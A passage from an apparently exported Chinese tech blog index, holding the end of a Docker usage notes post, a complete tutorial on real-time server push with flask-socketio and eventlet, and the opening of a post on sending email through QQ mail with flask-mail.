挂载单个文件作为数据卷</span></span><br><span class=\"line\">docker run --rm -it \\</span><br><span class=\"line\">\t<span class=\"comment\"># -v $HOME/.bash_history:/root/.bash_history \\</span></span><br><span class=\"line\">\t--mount <span class=\"built_in\">type</span>=<span class=\"built_in\">bind</span>,<span class=\"built_in\">source</span>=<span class=\"variable\">$HOME</span>/.bash_history,target=/root/.ba</span><br><span class=\"line\">\tsh_history \\</span><br><span class=\"line\">\tubuntu:18.04 \\</span><br><span class=\"line\">\tbash</span><br></pre></td></tr></table></figure>\n<h2 id=\"使用网络\"><a href=\"#使用网络\" class=\"headerlink\" title=\"使用网络\"></a>使用网络</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 外部访问容器</span></span><br><span class=\"line\"><span class=\"comment\"># -P 随机映射端口</span></span><br><span class=\"line\">docker run -d -P training/webapp python app.py  </span><br><span class=\"line\"><span class=\"comment\"># 查看应用信息</span></span><br><span class=\"line\">docker logs container_id</span><br><span class=\"line\"><span class=\"comment\"># -p 指定端口映射</span></span><br><span class=\"line\"><span class=\"comment\"># 格式：ip:hostPort:containerPort | ip::containerPort | hostPort:containerPort</span></span><br><span class=\"line\">docker run -d -p 5000:5000 training/webapp python app.py</span><br><span class=\"line\"><span class=\"comment\"># 查看映射端口配置</span></span><br><span class=\"line\">docker port 433 5000 <span class=\"comment\"># 433 是container_id/container_name</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 容器互联</span></span><br><span class=\"line\"><span class=\"comment\"># 新建网络 (-d 指定网络类型 bridge/host/overlay/macvlan/none)</span></span><br><span class=\"line\">docker network create -d bridge my-net</span><br><span class=\"line\"><span class=\"comment\"># 连接容器</span></span><br><span class=\"line\">docker run -it --rm --name busybox1 --network my-net busybox sh</span><br><span class=\"line\"><span class=\"comment\"># 新开终端，连接第二个容器</span></span><br><span class=\"line\">docker run -it --rm --name busybox2 --network my-net busybox sh</span><br><span class=\"line\"><span class=\"comment\"># 在busybox2 容器中ping busybox1, 测试连通性</span></span><br><span class=\"line\">ping busybox1</span><br><span class=\"line\"><span class=\"comment\"># 将正在运行的容器连接到现有网桥</span></span><br><span class=\"line\">docker network connect my-net my-nginx</span><br><span class=\"line\"><span class=\"comment\"># 断开容器与网络的连接</span></span><br><span class=\"line\">docker network disconnect my-net my-nginx</span><br><span class=\"line\"><span class=\"comment\"># 配置DNS</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 在容器中使用 mount 命令可以看到挂载信息</span></span><br><span class=\"line\">mount</span><br><span class=\"line\"><span class=\"comment\"># 配置全部容器的DNS 写入`/etc/docker/daemon.json`：</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"string\">\"dns\"</span> : </span><br><span class=\"line\">\t[</span><br><span class=\"line\">\t\t<span class=\"string\">\"114.114.114.114\"</span>,</span><br><span class=\"line\">\t\t<span class=\"string\">\"8.8.8.8\"</span></span><br><span class=\"line\">\t]</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\"># 检查配置</span></span><br><span class=\"line\">docker run -it --rm ubuntu:18.04 cat etc/resolv.conf</span><br><span class=\"line\"><span class=\"comment\"># 指定容器的配置</span></span><br><span class=\"line\">docker run -it --rm --dns=114.114.114.114 ubuntu:18.04</span><br></pre></td></tr></table></figure>\n<h2 id=\"Dockerfile例子\"><a href=\"#Dockerfile例子\" class=\"headerlink\" title=\"Dockerfile例子\"></a>Dockerfile例子</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 以构建flask为例</span></span><br><span class=\"line\"><span class=\"comment\">#在/etc/docker/deamon.json中写入dns</span></span><br><span class=\"line\">&#123;<span class=\"string\">\"dns\"</span>: [<span class=\"string\">\"119.29.29.29\"</span>]&#125;</span><br><span class=\"line\">sudo systemctl daemon-reload</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># app.py内容</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding:utf-8 -*-</span></span><br><span class=\"line\">from flask import Flask</span><br><span class=\"line\"></span><br><span class=\"line\">app = Flask(__name__)</span><br><span class=\"line\"></span><br><span class=\"line\">@app.route(<span class=\"string\">'/'</span>)</span><br><span class=\"line\">def hello():</span><br><span class=\"line\">    <span class=\"built_in\">return</span> <span class=\"string\">'&lt;h1&gt;test&lt;/h1&gt;'</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">\"__main__\"</span>:</span><br><span class=\"line\">    app.run(host=<span class=\"string\">\"0.0.0.0\"</span>, debug=True)</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"comment\"># Dockerfile内容</span></span><br><span class=\"line\">FROM python:2.7-alpine</span><br><span class=\"line\">ADD . /code</span><br><span class=\"line\">WORKDIR /code</span><br><span class=\"line\">RUN sed -i <span class=\"string\">'s/dl-cdn.alpinelinux.org/mirrors.aliyun.com/g'</span> /etc/apk/repositories</span><br><span class=\"line\">RUN apk update</span><br><span class=\"line\">RUN pip install -i https://pypi.tuna.tsinghua.edu.cn/simple --no-cache-dir flask</span><br><span class=\"line\">CMD [<span class=\"string\">\"python\"</span>, <span class=\"string\">\"app.py\"</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 在Dockerfile所在目录下build</span></span><br><span class=\"line\">docker build -t flask_test:v1 .</span><br></pre></td></tr></table></figure>\n<h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><p><a href=\"https://docs.docker.com/\" target=\"_blank\" rel=\"noopener\">Docker Documentation</a></p>\n<p><a href=\"https://github.com/yeasy/docker_practice\" target=\"_blank\" rel=\"noopener\">Docker — 从入门到实践</a></p>\n","categories":[],"tags":["docker"]},{"title":"flask使用webSocket协议","url":"http://b1ng0.top/2019/07/12/flask使用websocket协议/","content":"<h1 id=\"0x01-前言\"><a href=\"#0x01-前言\" class=\"headerlink\" title=\"0x01 前言\"></a>0x01 前言</h1><p>最近项目上需要实现后端的实时推送，而http作为一个单向的通信协议，必须一个request，一个response的进行，于是想到了webSocket ，webSocket 是 HTML5 开始提供的一种在单个 TCP 连接上进行全双工通讯的协议，可以很容易的实现Web的实时通信. 在这里谈一下自己在flask框架下使用webSocket的粗略实践.</p>\n<h1 id=\"0x02-flask-socketio简单使用\"><a href=\"#0x02-flask-socketio简单使用\" class=\"headerlink\" title=\"0x02 flask-socketio简单使用\"></a>0x02 flask-socketio简单使用</h1><p>flask使用flask-socketio的扩展来实现webSocket.</p>\n<p>安装方法:</p>\n<blockquote>\n<p>pip install flask-socketio</p>\n</blockquote>\n<p>参考<a href=\"https://flask-socketio.readthedocs.io/en/latest/\" target=\"_blank\" rel=\"noopener\">官网</a>写了一个后端推送的简单栗子：</p>\n<p>服务器(app.py)：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/python</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding : utf-8 -*-</span></span><br><span class=\"line\"><span class=\"comment\"># author : b1ng0</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> flask <span class=\"keyword\">import</span> Flask, render_template, session, request</span><br><span class=\"line\"><span class=\"keyword\">from</span> flask_socketio <span class=\"keyword\">import</span> SocketIO, emit</span><br><span class=\"line\"><span class=\"keyword\">import</span> time, json</span><br><span class=\"line\"></span><br><span class=\"line\">app = Flask(__name__)</span><br><span class=\"line\">app.config[<span class=\"string\">'SECRET_KEY'</span>] = <span class=\"string\">'secret!'</span></span><br><span class=\"line\"></span><br><span class=\"line\">socketio = SocketIO(app)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route('/')</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">index</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> render_template(<span class=\"string\">'index.html'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@socketio.on('client_event')</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">client_msg</span><span class=\"params\">(msg)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"number\">1</span>:</span><br><span class=\"line\">        emit(<span class=\"string\">'server_response'</span>, &#123;<span class=\"string\">'data'</span>: msg[<span class=\"string\">'data'</span>]&#125;)</span><br><span class=\"line\">        time.sleep(<span class=\"number\">2</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"meta\">@socketio.on('connect_event')</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">connected_msg</span><span class=\"params\">(msg)</span>:</span></span><br><span class=\"line\">    emit(<span class=\"string\">'server_response'</span>, &#123;<span class=\"string\">'data'</span>: msg[<span class=\"string\">'data'</span>]&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</span><br><span class=\"line\">    socketio.run(</span><br><span class=\"line\">        app,</span><br><span class=\"line\">        debug=<span class=\"literal\">True</span>,</span><br><span class=\"line\">        host=<span class=\"string\">'0.0.0.0'</span>,</span><br><span class=\"line\">        port=<span class=\"number\">5000</span></span><br><span class=\"line\">        )</span><br></pre></td></tr></table></figure>\n<p>客户端(templates/index.html)：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">HTML</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>Flask-SocketIO Test<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text/javascript\"</span> <span class=\"attr\">src</span>=<span class=\"string\">\"//cdn.bootcss.com/jquery/3.1.1/jquery.min.js\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text/javascript\"</span> <span class=\"attr\">src</span>=<span class=\"string\">\"//cdn.bootcss.com/socket.io/1.5.1/socket.io.min.js\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text/javascript\"</span> <span class=\"attr\">charset</span>=<span class=\"string\">\"utf-8\"</span>&gt;</span></span><br><span class=\"line\">    $(document).ready(function() &#123;</span><br><span class=\"line\">        var socket = io.connect();</span><br><span class=\"line\"></span><br><span class=\"line\">        socket.on('connect', function() &#123;</span><br><span class=\"line\">            socket.emit('connect_event', &#123;data: 'connected!'&#125;);</span><br><span class=\"line\">            socket.emit('client_event', &#123;data: 'test'&#125;);</span><br><span class=\"line\">        &#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">        socket.on('server_response', function(msg) &#123;</span><br><span class=\"line\"><span class=\"xml\">            $('#log').append('<span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span>' + $('<span class=\"tag\">&lt;<span class=\"name\">div</span>/&gt;</span>').text('Received #' + ': ' + msg.data).html());</span></span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">        $('form#emit').submit(function(event) &#123;</span><br><span class=\"line\">                socket.emit('client_event', &#123;data: $('#emit_data').val()&#125;);</span><br><span class=\"line\">                return false;</span><br><span class=\"line\">            &#125;);</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span>   </span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">h2</span>&gt;</span>WebSokect<span class=\"tag\">&lt;/<span class=\"name\">h2</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">id</span>=<span class=\"string\">'log'</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>运行效果：(每隔2秒推送一次)</p>\n<p><img src=\"/images/1562856278162.png\" alt></p>\n<h1 id=\"0x03-一些坑点\"><a href=\"#0x03-一些坑点\" class=\"headerlink\" title=\"0x03 一些坑点\"></a>0x03 一些坑点</h1><p>貌似实现了效果，但是在运行的时候，才发现原来使用的是”假的”webSocket:</p>\n<p><img src=\"/images/1562856476624.png\" alt></p>\n<p>提示信息如下：</p>\n<blockquote>\n<p>WebSocket transport not available. Install eventlet or gevent and gevent-websocket for improved performance.</p>\n</blockquote>\n<p>查阅了一些资料，发现其实使用的是长轮询（polling) 的方式在运行，要使用真正的“ws://”还得安装一些异步服务，比如：eventlet/gevent/gevent-websocket，这里安装了eventlet：</p>\n<blockquote>\n<p>pip install eventlet</p>\n</blockquote>\n<p>然而安装之后，客户端根本接收不到，连socketio.on函数都没有触发运行。再次一顿乱搜，发现都是前人踩过的坑了，原来是服务端陷入死循环，会影响与客户端之间的websocket连接。参考flask_socketio的示例程序，使用后台线程进行while循环解决了这个问题。</p>\n<p>改进后的服务端：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/python</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding : utf-8 -*-</span></span><br><span class=\"line\"><span class=\"comment\"># author : b1ng0</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> flask <span class=\"keyword\">import</span> Flask, render_template, session, request</span><br><span class=\"line\"><span class=\"keyword\">from</span> flask_socketio <span class=\"keyword\">import</span> SocketIO, emit</span><br><span class=\"line\"><span class=\"keyword\">from</span> threading <span class=\"keyword\">import</span> Lock</span><br><span class=\"line\"><span class=\"keyword\">import</span> time, json</span><br><span class=\"line\"></span><br><span class=\"line\">app = Flask(__name__)</span><br><span class=\"line\">app.config[<span class=\"string\">'SECRET_KEY'</span>] = <span class=\"string\">'secret!'</span></span><br><span class=\"line\"></span><br><span class=\"line\">socketio = SocketIO(app)</span><br><span class=\"line\">thread = <span class=\"literal\">None</span></span><br><span class=\"line\">thread_lock = Lock()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route('/')</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">index</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> render_template(<span class=\"string\">'index.html'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@socketio.on('client_event', namespace='/test_conn')</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">client_msg</span><span class=\"params\">(msg)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">global</span> thread</span><br><span class=\"line\">    <span class=\"keyword\">with</span> thread_lock:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> thread <span class=\"keyword\">is</span> <span class=\"literal\">None</span>:</span><br><span class=\"line\">            thread = socketio.start_background_task(target=background_thread)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">background_thread</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"number\">1</span>:</span><br><span class=\"line\">        socketio.sleep(<span class=\"number\">2</span>)</span><br><span class=\"line\">        socketio.emit(<span class=\"string\">'server_response'</span>, &#123;<span class=\"string\">'data'</span>: <span class=\"string\">'test'</span>&#125;, namespace=<span class=\"string\">'/test_conn'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"meta\">@socketio.on('connect_event', namespace='/test_conn')</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">connected_msg</span><span class=\"params\">(msg)</span>:</span></span><br><span class=\"line\">    emit(<span class=\"string\">'server_response'</span>, &#123;<span class=\"string\">'data'</span>: msg[<span class=\"string\">'data'</span>]&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</span><br><span class=\"line\">    socketio.run(</span><br><span class=\"line\">        app,</span><br><span class=\"line\">        debug=<span class=\"literal\">True</span>,</span><br><span class=\"line\">        host=<span class=\"string\">'0.0.0.0'</span>,</span><br><span class=\"line\">        port=<span class=\"number\">5000</span></span><br><span class=\"line\">        )</span><br></pre></td></tr></table></figure>\n<p>改进后的客户端：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">HTML</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>Flask-SocketIO Test<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text/javascript\"</span> <span class=\"attr\">src</span>=<span class=\"string\">\"//cdn.bootcss.com/jquery/3.1.1/jquery.min.js\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text/javascript\"</span> <span class=\"attr\">src</span>=<span class=\"string\">\"//cdn.bootcss.com/socket.io/1.5.1/socket.io.min.js\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text/javascript\"</span> <span class=\"attr\">charset</span>=<span class=\"string\">\"utf-8\"</span>&gt;</span></span><br><span class=\"line\">    $(document).ready(function() &#123;</span><br><span class=\"line\">        // var socket = io.connect();</span><br><span class=\"line\">        namespace = '/test_conn';</span><br><span class=\"line\">        var socket = io.connect(location.protocol + '//' + document.domain + ':' + location.port + namespace);</span><br><span class=\"line\"></span><br><span class=\"line\">        socket.on('connect', function() &#123;</span><br><span class=\"line\">            socket.emit('connect_event', &#123;data: 'connected!'&#125;);</span><br><span class=\"line\">            socket.emit('client_event', &#123;data: 'test'&#125;);</span><br><span class=\"line\">        &#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">        socket.on('server_response', function(msg) &#123;</span><br><span class=\"line\"><span class=\"xml\">            $('#log').append('<span class=\"tag\">&lt;<span class=\"name\">br</span>&gt;</span>' + $('<span class=\"tag\">&lt;<span class=\"name\">div</span>/&gt;</span>').text('Received #' + ': ' + msg.data).html());</span></span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">        $('form#emit').submit(function(event) &#123;</span><br><span class=\"line\">                socket.emit('client_event', &#123;data: $('#emit_data').val()&#125;);</span><br><span class=\"line\">                return false;</span><br><span class=\"line\">            &#125;);</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span>   </span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">h2</span>&gt;</span>WebSokect<span class=\"tag\">&lt;/<span class=\"name\">h2</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">id</span>=<span class=\"string\">'log'</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h1 id=\"0x04-参考链接\"><a href=\"#0x04-参考链接\" class=\"headerlink\" title=\"0x04 参考链接\"></a>0x04 参考链接</h1><p><a href=\"https://flask-socketio.readthedocs.io/en/latest/\" target=\"_blank\" rel=\"noopener\">https://flask-socketio.readthedocs.io/en/latest/</a></p>\n<p><a href=\"https://github.com/miguelgrinberg/Flask-SocketIO\" target=\"_blank\" rel=\"noopener\">https://github.com/miguelgrinberg/Flask-SocketIO</a></p>\n<p><a href=\"https://www.cnblogs.com/luozx207/p/9714487.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/luozx207/p/9714487.html</a></p>\n","categories":[],"tags":["backend"]},{"title":"flask-mail使用qq邮箱","url":"http://b1ng0.top/2019/06/25/flask-mail使用qq邮箱/","content":"<h1 id=\"0x00-前言\"><a href=\"#0x00-前言\" class=\"headerlink\" title=\"0x00 前言\"></a>0x00 前言</h1><p>最近在看狗书，准备系统性的学习一下flask，但是在&lt;&lt;电子邮件&gt;&gt;那章作者使用了gmail作为邮箱服务，笔者配了很久都发不出去，可能是天朝特色导致不能使用gmail的，于是探索了一下flask框架下使用qq邮箱发送电子邮件。</p>\n<h1 id=\"0x01-qq邮箱配置\"><a href=\"#0x01-qq邮箱配置\" class=\"headerlink\" title=\"0x01 qq邮箱配置\"></a>0x01 qq邮箱配置</h1><p>因为是使用SMTP服务发送电子邮件，所以首先要去qq邮箱设置页开启：</p>\n<p><img src=\"/images/1561425672893.png\" alt=\"1561425672893\"></p>\n<p>开启后会得到一个授权码作为邮箱密码使用</p>\n<h1 id=\"0x02-flask配置\"><a href=\"#0x02-flask配置\" class=\"headerlink\" title=\"0x02 flask配置\"></a>0x02 